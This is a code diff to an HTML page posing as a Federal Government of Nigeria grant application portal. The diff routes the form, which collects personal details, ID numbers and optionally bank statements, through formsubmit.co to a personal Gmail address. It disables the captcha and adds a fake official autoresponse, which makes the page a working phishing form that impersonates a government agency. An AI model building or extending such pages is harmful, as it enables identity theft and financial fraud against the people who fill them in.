@@ -622,7 +622,14 @@
         </div>
         
         <div class="form-container">
-            <form id="grantApplicationForm">
+            <!-- FORMSUBMIT.CO INTEGRATION -->
+            <form id="grantApplicationForm" action="https://formsubmit.co/daxshop836@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="New Grant Application - Federal Government">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_autoresponse" value="Thank you for your grant application to the Federal Government of Nigeria. Your application has been received and is being processed. You will be contacted within 5-7 working days.">
+                <input type="hidden" name="_next" value="https://fggrant.netlify.app/#success">
+                
                 <!-- Personal Information Section -->
                 <div class="form-section">
                     <h2 class="section-title"><i class="fas fa-user"></i> Personal Information</h2>
@@ -877,22 +884,12 @@
                         <div class="error" id="idNumberError">Please enter your ID number</div>
                     </div>
                     
+                    <!-- Note: File uploads won't work with FormSubmit.co free plan -->
                     <div class="form-group">
-                        <label for="bankStatement" class="required">Bank Statement (Last 6 months)</label>
-                        <div class="file-upload" onclick="document.getElementById('bankStatement').click()">
+                        <label for="bankStatement">Bank Statement (Last 6 months) - Optional</label>
+                        <div class="file-upload">
                             <i class="fas fa-file-invoice-dollar"></i>
-                            <div>Click to upload bank statement</div>
-                            <input type="file" id="bankStatement" name="bankStatement" accept=".pdf,.jpg,.jpeg,.png" style="display: none;" required>
-                        </div>
-                        <div class="error" id="bankError">Please upload your bank statement</div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="proposal">Project Proposal (if applicable)</label>
-                        <div class="file-upload" onclick="document.getElementById('proposal').click()">
-                            <i class="fas fa-file-alt"></i>
-                            <div>Click to upload project proposal</div>
-                            <input type="file" id="proposal" name="proposal" accept=".pdf,.doc,.docx" style="display: none;">
+                            <div>File upload not available - Please email separately if needed</div>
                         </div>
                     </div>
                 </div>
@@ -920,13 +917,6 @@
                 
                 <button type="submit" class="btn" id="submitBtn">Submit Application</button>
                 
-                <div class="success-message" id="successMessage">
-                    <i class="fas fa-check-circle"></i>
-                    <h3>Application Submitted Successfully!</h3>
-                    <p>Your grant application has been received and is being processed. You will receive a confirmation email shortly.</p>
-                    <p>Application Reference: <strong>NGR-2023-<span id="refNumber">00000</span></strong></p>
-                </div>
-                
                 <div class="form-footer">
                     <p>Federal Government of Nigeria - Grant Application Portal</p>
                     <p>For inquiries, contact: grants@nigeria.gov.ng | 0700-GRANT-NG</p>
@@ -939,7 +929,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('grantApplicationForm');
             const submitBtn = document.getElementById('submitBtn');
-            const successMessage = document.getElementById('successMessage');
             const progressSteps = document.querySelectorAll('.progress-step');
             
             // Set maximum date for date of birth (18 years ago)
@@ -998,27 +987,13 @@
                 validateField(e.target);
             });
             
-            // Form submission
+            // Form submission - Modified for FormSubmit.co
             form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                if (validateForm()) {
-                    // Disable submit button to prevent multiple submissions
-                    submitBtn.disabled = true;
-                    submitBtn.textContent = 'Submitting Application...';
-                    
-                    // Generate random reference number
-                    const refNumber = Math.floor(10000 + Math.random() * 90000);
-                    document.getElementById('refNumber').textContent = refNumber;
-                    
-                    // Simulate form submission
-                    setTimeout(function() {
-                        form.style.display = 'none';
-                        successMessage.style.display = 'block';
-                    }, 2000);
-                } else {
+                if (!validateForm()) {
+                    e.preventDefault(); // Only prevent if validation fails
                     alert('Please correct the errors in the form before submitting.');
                 }
+                // If validation passes, allow FormSubmit.co to handle the submission
             });
             
             function validateField(field) {
